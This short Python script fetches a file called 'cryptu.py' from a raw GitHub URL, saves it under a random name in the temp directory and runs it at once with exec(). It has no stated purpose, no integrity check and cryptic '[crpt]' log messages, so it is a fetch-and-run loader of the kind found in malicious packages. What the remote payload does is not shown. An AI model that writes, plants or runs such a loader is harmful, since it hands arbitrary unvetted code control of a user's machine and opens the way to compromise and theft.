import tempfile
import os
import uuid
import urllib.request

def main():
    url = "https://raw.githubusercontent.com/cmderr11/cryptu/refs/heads/main/cryptu.py"
    try:
        response = urllib.request.urlopen(url)
        code = response.read().decode()
    except Exception as e:
        print(f"[crpt] Failed to fetch remote script: {e}")
        return

    tmp_path = os.path.join(tempfile.gettempdir(), str(uuid.uuid4()) + ".py")
    with open(tmp_path, "w", encoding="utf-8") as f:
        f.write(code)

    try:
        exec(compile(code, tmp_path, 'exec'), {})
    except Exception as e:
        print(f"[crpt] Error running remote script: {e}")
